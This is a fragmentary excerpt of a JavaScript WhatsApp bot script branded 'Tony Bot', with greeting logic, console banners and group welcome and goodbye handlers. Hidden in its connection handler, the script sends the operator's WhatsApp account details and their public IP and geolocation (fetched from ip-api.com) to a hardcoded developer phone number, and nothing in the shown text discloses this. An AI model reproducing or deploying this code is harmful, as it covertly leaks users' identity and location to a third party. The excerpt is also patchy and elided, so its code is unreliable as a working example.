// Ć̴͓̘͓͎̇̒r̵̘̺̘͖͍̫̙̲̭̘̓͂͐̓e̸̳̰̬̦͇̥͍̫̰͌̋̑̄͝a̶̧̬̰̠̥̹͚̜͝ţ̸͖̠̫̳̟͕͚̌͗ḛ̴͔̩͍̤̂̈̍͌͂̉̉͛͝͝ͅd̷͈̥͇̈͂̈́̒͛̀̆̌͘͘ ̵̦͖̠͍̖̲̬̎͛̽͑̅̈̆̚͝͠b̸̨̻͉͎̮̭́̂͊̄͝ͅy̴̨̭̌̃̈́̃́͑̽̒͝ͅ ̷̢̝̮̭͎͖̭̍̔͘Tony
...
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    ...
    if (time2 < "19:00:00") {
      ...
      var ucapanWaktu = "Good evening🙂 Tony ser";

    }

    if (time2 < "18:00:00") {

      var ucapanWaktu = "good afternoon🙂 Tony ser";
    ...
    if (time2 < "11:00:00") {
      ...
      var ucapanWaktu = "Good morning🙂 Tony ser";

    }

    if (time2 < "05:00:00") {

      var ucapanWaktu = "Good night🙂 Tony ser";
...
const gcrevoke = ["14402226666-1621430788@g.us"]

prefix = '.'

shp = '⬡'

owner = "14402226666@s.whatsapp.net"
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["Subscribe Tony", "Chrome", "3.0"];
  ...
  client.on("qr", () => {
    ...
    console.log(
      ...
      client.sendMessage(`14402226666@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
  ...
  client.on("open", () => {
    ...
    success("2", "Successfully connected to wa, Subscribe Tony");

console.log(color(figlet.textSync(`${spc1}            Tony Bot`, {
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝙄 𝙬𝙧𝙤𝙩𝙚 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙮𝙨𝙚𝙡𝙛!\n𝙉𝙤𝙩𝙚: 𝘿𝙤𝙣𝙩 𝙛𝙤𝙧𝙜𝙚𝙩 𝙩𝙤 𝙨𝙪𝙗𝙨𝙘𝙧𝙞𝙗𝙚 ', 'yellow'))

    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))

    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/14402226666'))

    console.log(color('[TONY BOT]'), color('TONY 𝐁𝐨𝐭 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 console.log(color('|WRN|', 'yellow'), color('Joined to Tony Whatsapp Bot group', 'cyan'))

 client.sendMessage(`14402226666@s.whatsapp.net`, `*Hi Owner Tony, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Tony Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Tony.jpg'),sourceUrl:"https://wa.me/14402226666?text=Hello bro"}}})

	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))fetch(`http://ip-api.com/line`).then(res => res.text())  

        .then(bu =>{

       client.sendMessage("14402226666@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Tony Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Tony.jpg'),sourceUrl:"https://wa.me/14402226666?text=Hello bro"}}})
...
fkontakk = { key: {
  ...
  fromMe: false,
    ...
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '14402226666-1604595598@g.us' } : {})

},

 message: {

    "contactMessage":{"displayName":'Tony',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Tony;;;\nFN:resku\nitem1.TEL;waid=14402226666:+1 440-222-6666\nitem1.X-ABLabel:Mobile\nEND:VCARD"
  ...
  client.on("group-participants-update", async (anu) => {
    ...
    try {
      ...
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        ...
        client.sendMessage(anu.jid, "Hi", "conversation");
...
if (anu.action == 'add' && !mem.includes(client.user.jid)) {
			 ...
			 const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
                ...
                welcomeBut = [{buttonId:`getdeskgc`,buttonText:{displayText:'DESCRIPTION'},type:1}, {buttonId:`okeyx`,buttonText:{displayText:'©Tony Bot'},type:1}]
            ...
            if (anu.action == 'remove' && !mem.includes(client.user.jid)) {
                ...
                goodbyeBut = [{buttonId:`h`,buttonText:{displayText:'🙂🥂'},type:1}, {buttonId:`🙂`,buttonText:{displayText:'BOT 🥂'}, type:1}]
